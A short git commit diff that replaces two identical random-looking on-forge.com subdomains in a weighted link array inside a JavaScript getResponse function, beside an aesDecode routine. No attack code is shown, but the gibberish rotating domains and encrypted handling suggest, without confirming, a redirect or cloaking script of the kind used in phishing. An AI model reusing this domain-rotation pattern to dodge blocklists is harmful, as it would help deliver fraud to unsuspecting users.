6decea380d6034bb4420b4b4c4bed93560502cf8
animalinside <akshay.anand12@yahoo.com>
2026-05-16 08:56:34 +0530

    Change URLs in getResponse links array
    Updated URLs in the links array for getResponse function.

--- index.js
+++ index.js
@@ -71,8 +71,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://alkfdlkdkkdkdd.on-forge.com/", weight: 0.5 },
-        { url: "https://alkfdlkdkkdkdd.on-forge.com/", weight: 0.5 }
+        { url: "https://afldskdfkkfkf.on-forge.com/", weight: 0.5 },
+        { url: "https://afldskdfkkfkf.on-forge.com/", weight: 0.5 }
       
     ];
 
